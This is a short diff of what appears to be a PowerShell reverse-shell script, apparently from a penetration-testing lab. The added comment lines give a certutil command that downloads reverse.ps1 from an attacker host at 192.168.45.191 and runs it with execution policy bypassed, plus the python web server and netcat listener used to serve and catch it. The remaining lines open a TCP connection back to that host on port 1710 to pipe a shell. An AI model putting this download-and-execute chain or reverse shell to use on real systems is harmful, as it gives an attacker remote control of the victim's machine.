@@ -1,3 +1,7 @@
+#mkdir C:\tmp; certutil -urlcache -f http://192.168.45.191/reverse.ps1 C:\tmp\reverse.ps1; powershell -ExecutionPolicy Bypass -File "C:\tmp\reverse.ps1"
+#python -m http.server 80
+#nc -nlvp 1710
+
 $client = New-Object System.Net.Sockets.TCPClient("192.168.45.191", 1710)
 $stream = $client.GetStream()
 $writer = New-Object System.IO.StreamWriter($stream)
